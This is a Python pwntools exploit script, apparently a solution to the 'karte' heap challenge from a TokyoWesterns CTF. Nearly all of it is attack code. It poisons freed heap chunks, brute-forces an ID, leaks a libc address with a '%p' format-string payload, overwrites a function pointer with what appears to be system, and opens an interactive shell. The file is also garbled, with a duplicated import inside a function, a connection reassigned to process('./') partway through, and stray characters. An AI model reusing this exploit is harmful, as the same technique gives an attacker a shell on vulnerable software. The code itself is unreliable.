from pwn import *

#p = process("./karte-2a6f1c5c778037eba5d86ad3e20cc387a307643a785059669dd2ce1d999a2268")
p = remote("karte.chal.ctf.westerns.tokyo",10001)

def go_name(name) : 
	p.sendafter("..",name)

	from pwn import *

p = process("./")

def add(size,content) :
	p.sendlineafter(">","1")
	p.sendlineafter(">",str(size))
	p.sendafter(">",content)
	p.recvuntil("id ")
	return int(p.recvline()[:-1])

def edit(id_,content) :
	p.sendlineafter(">","4")
	p.sendlineafter(">",str(id_))
	p.sendafter(">",content)

def free(id_) :
	p.sendlineafter(">","3")
	p.sendlineafter(">",str(id_))

go_name(p64(0xfbad1800)*7)


_0id = add(0x67,"A"*0x66) #0
_1id = add(0x100000,"A") 
_2id = add(0x67,"A"*0x66) #0

free(_0id)

free(_2id)


for i in range(5) :
	_0id = add(0x67,"A"*0x66) #0
	free(_0id)

_0id = add(0x67,"A"*0x66) #0
_2id = add(0x67,"A"*0x66) #0


free(_2id)
free(_0id)
edit(_0id,p32(0x602155))

_0id = add(0x67,"A"*0x66)


free(_1id)
_2id = add(0x67,"%aa"+p64(0x0000000000602018)+p64(0x0000deadc0bebeef)+"A"*8)

key = 0

for i in range(0x30,0xff+1) :
	print hex(i)
	p.sendlineafter(">","4")
	p.sendlineafter(">",str((0x616125<<8)+i))
	k = p.recvuntil("not",timeout=0.3) 
	print(k)
	if k == "" :
		key = (0x616125<<8) + i
		break

p.sendafter(">",p32(0x400760)+"\x00"*2)

edit(_0id,"%p " *30)
free(_0id)

p.recvuntil("000 (nil) (nil) ")
libcbase = int(p.recvline().split(" ")[0],16) - 0x401733

print hex(libcbase)

edit(_0id,"/bin/sh;")
edit(_2id,"%aa"+p64(0x0000000000602078).replace("\x00",""))

edit(key,p64(libcbase+0x4f440).replace("\x00",""))
\
p.sendlineafter(">","sh")
p.interactive()
